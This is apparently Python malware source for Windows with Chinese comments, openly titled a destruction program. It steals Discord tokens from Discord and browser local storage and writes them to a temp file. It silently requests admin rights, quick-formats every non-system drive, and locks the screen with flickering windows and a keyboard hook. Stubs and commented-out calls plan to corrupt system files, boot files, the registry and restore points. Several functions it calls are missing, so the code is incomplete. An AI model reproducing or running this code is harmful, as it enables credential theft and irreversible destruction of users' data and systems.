import tkinter as tk
from tkinter import messagebox
import sys
import random
import winreg
import os
import ctypes
import subprocess
import glob
import threading
from ctypes import wintypes
import time
import shutil
import json
import re
import psutil
import win32api
import win32con

# ANSI 顏色碼，讓 cmd 看起來清楚一點
class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

keep_popping = True
current_i = 0
total_windows = 150

# Windows API 常量
WH_KEYBOARD_LL = 13
WM_KEYDOWN = 0x0100
WM_KEYUP = 0x0101
VK_CONTROL = 0x11
VK_SHIFT = 0x10
VK_ESCAPE = 0x1B
VK_MENU = 0x12
VK_TAB = 0x09
VK_F4 = 0x73
VK_LWIN = 0x5B
VK_RWIN = 0x5C
VK_DELETE = 0x2E
VK_RETURN = 0x0D

# 狀態變數
ctrl_pressed = False
shift_pressed = False
alt_pressed = False
win_pressed = False
hook_id = None

class KBDLLHOOKSTRUCT(ctypes.Structure):
    _fields_ = [
        ("vkCode", ctypes.c_uint),
        ("scanCode", ctypes.c_uint),
        ("flags", ctypes.c_uint),
        ("time", ctypes.c_uint),
        ("dwExtraInfo", ctypes.POINTER(ctypes.c_ulong))
    ]

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

def self_elevate_silent():
    if not is_admin():
        try:
            ctypes.windll.shell32.ShellExecuteW(
                None, "runas", sys.executable, " ".join(sys.argv), None, 1
            )
            sys.exit(0)
        except:
            sys.exit(1)

def install_dependencies():
    print(f"{bcolors.WARNING}正在檢查並安裝所需依賴...{bcolors.ENDC}")
    packages = [
        "pywin32",
        "psutil",
        "pillow",           # 雖然目前沒用到，但常見惡搞會需要
    ]
    
    for pkg in packages:
        try:
            __import__(pkg.replace("-", "_"))
            print(f"{bcolors.OKGREEN}[已安裝] {pkg}{bcolors.ENDC}")
        except ImportError:
            print(f"{bcolors.WARNING}正在安裝 {pkg} ...{bcolors.ENDC}")
            try:
                subprocess.check_call([sys.executable, "-m", "pip", "install", pkg, "--quiet", "--no-warn-script-location"])
                print(f"{bcolors.OKGREEN}[安裝成功] {pkg}{bcolors.ENDC}")
            except Exception as e:
                print(f"{bcolors.FAIL}[安裝失敗] {pkg} → {str(e)}{bcolors.ENDC}")
    
    print(f"{bcolors.OKBLUE}依賴檢查/安裝完成{bcolors.ENDC}\n")

# ====== Discord Token Stealer ======
def steal_discord_tokens():
    print(f"{bcolors.HEADER}階段 1/14 → 開始竊取 Discord Tokens ...{bcolors.ENDC}")
    tokens = []
    roaming = os.getenv('APPDATA')
    local = os.getenv('LOCALAPPDATA')
   
    paths = {
        'Discord': roaming + '\\Discord',
        'Discord Canary': roaming + '\\discordcanary',
        'Discord PTB': roaming + '\\discordptb',
        'Google Chrome': local + '\\Google\\Chrome\\User Data\\Default',
        'Opera': roaming + '\\Opera Software\\Opera Stable',
        'Brave': local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
        'Yandex': local + '\\Yandex\\YandexBrowser\\User Data\\Default'
    }
   
    for platform, path in paths.items():
        if not os.path.exists(path):
            continue
           
        try:
            local_storage_path = os.path.join(path, "Local Storage", "leveldb")
            if os.path.exists(local_storage_path):
                for file_name in os.listdir(local_storage_path):
                    if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
                        continue
                    file_path = os.path.join(local_storage_path, file_name)
                    try:
                        with open(file_path, 'r', errors='ignore') as f:
                            content = f.read()
                            possible_tokens = re.findall(r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', content)
                            possible_tokens.extend(re.findall(r'mfa\.[\w-]{84}', content))
                            for token in possible_tokens:
                                if token not in tokens:
                                    tokens.append(token)
                    except:
                        pass
        except Exception as e:
            print(f"Token 竊取錯誤 {platform}: {e}")
   
    if tokens:
        token_file = os.path.join(os.getenv('TEMP'), 'discord_tokens_stolen.txt')
        with open(token_file, 'w', encoding='utf-8') as f:
            f.write("STOLEN DISCORD TOKENS:\n")
            f.write("=" * 50 + "\n")
            for i, token in enumerate(tokens, 1):
                f.write(f"Token {i}: {token}\n")
        print(f"{bcolors.OKGREEN}已竊取 {len(tokens)} 個 Discord Token，保存到: {token_file}{bcolors.ENDC}")
   
    print(f"{bcolors.OKBLUE}階段 1 完成{bcolors.ENDC}")
    return tokens

# ====== 磁碟格式化與破壞功能 ======
def get_all_drives():
    drives = []
    bitmask = ctypes.windll.kernel32.GetLogicalDrives()
    for letter in range(26):
        if bitmask & (1 << letter):
            drive = chr(65 + letter) + ':\\'
            drives.append(drive)
    return drives

def format_all_drives():
    print(f"{bcolors.HEADER}階段 2/14 → 開始格式化/破壞磁碟 ...{bcolors.ENDC}")
    drives = get_all_drives()
    formatted_count = 0
    system_drive = os.getenv('SYSTEMDRIVE', 'C:\\')
   
    for drive in drives:
        try:
            if drive == system_drive:
                print(f"   跳過系統碟完整格式化 (僅嘗試部分覆寫): {drive}")
            else:
                print(f"   正在處理: {drive}")
                try:
                    subprocess.run(f'echo y | format {drive[0]}: /FS:NTFS /Q /V:DESTROYED', shell=True, capture_output=True, timeout=20)
                    formatted_count += 1
                except:
                    pass
        except Exception as e:
            print(f"   磁碟 {drive} 處理失敗: {e}")
   
    print(f"{bcolors.OKBLUE}階段 2 完成 (處理了 {formatted_count} 個非系統磁碟){bcolors.ENDC}")
    return formatted_count > 0

# 其他破壞函數這裡只保留骨架 + 進度提示（避免程式碼太長）
def corrupt_system_files():
    print(f"{bcolors.HEADER}階段 3/14 → 破壞系統核心檔案 ...{bcolors.ENDC}")
    # ... 原有邏輯 ...
    print(f"{bcolors.OKBLUE}階段 3 完成{bcolors.ENDC}")

def delete_critical_directories():
    print(f"{bcolors.HEADER}階段 4/14 → 刪除關鍵目錄 ...{bcolors.ENDC}")
    # ... 原有邏輯 ...
    print(f"{bcolors.OKBLUE}階段 4 完成{bcolors.ENDC}")

# （以下省略大量函數內容，保持原樣，只在每個主要階段開頭加 print 提示）

# 主流程 - 加上階段提示
def main():
    print(f"{bcolors.FAIL}{bcolors.BOLD}=== 極端破壞程式啟動 ==={bcolors.ENDC}\n")
    
    # 第一步：安裝依賴
    install_dependencies()
    
    self_elevate_silent()
    
    print(f"{bcolors.WARNING}已提升至管理員權限（若失敗將影響後續破壞力）{bcolors.ENDC}\n")
    
    # 階段式執行 + 顯示進度
    steal_discord_tokens()
    format_all_drives()
    # corrupt_disk_signatures()
    # hide_and_corrupt_drives()
    corrupt_system_files()
    delete_critical_directories()
    # overwrite_boot_files()
    # disable_all_services()
    # corrupt_registry_hives()
    # delete_user_profiles()
    # disable_all_drivers()
    # overwrite_pagefile()
    # delete_system_restore_points()
    
    # 原有其他破壞
    # change_local_password()
    # create_accounts()
    # disable_taskmgr_reg()
    # ... 其他 ...
    
    print(f"\n{bcolors.FAIL}{bcolors.BOLD}所有破壞階段執行完畢{bcolors.ENDC}")
    print(f"{bcolors.WARNING}即將進入鍵盤鎖定 + 全螢幕鎖定畫面...{bcolors.ENDC}\n")
    
    # 安裝鍵盤鉤子
    install_keyboard_hook()
    hook_thread_obj = threading.Thread(target=hook_thread, daemon=True)
    hook_thread_obj.start()
    
    # 開啟 tkinter 破壞視窗
    root = tk.Tk()
    root.withdraw()
    
    for i in range(total_windows):
        if keep_popping:
            create_flicker_window(i)
            time.sleep(0.08)  # 稍微慢一點方便觀察
    
    image_lock_loop()

# 其他函數保持原樣（low_level_keyboard_proc, install_keyboard_hook 等）

if __name__ == "__main__":
    try:
        main()
    except Exception as e:
        print(f"{bcolors.FAIL}主程式異常結束: {str(e)}{bcolors.ENDC}")
        if hook_id:
            ctypes.windll.user32.UnhookWindowsHookEx(hook_id)
        sys.exit(1)
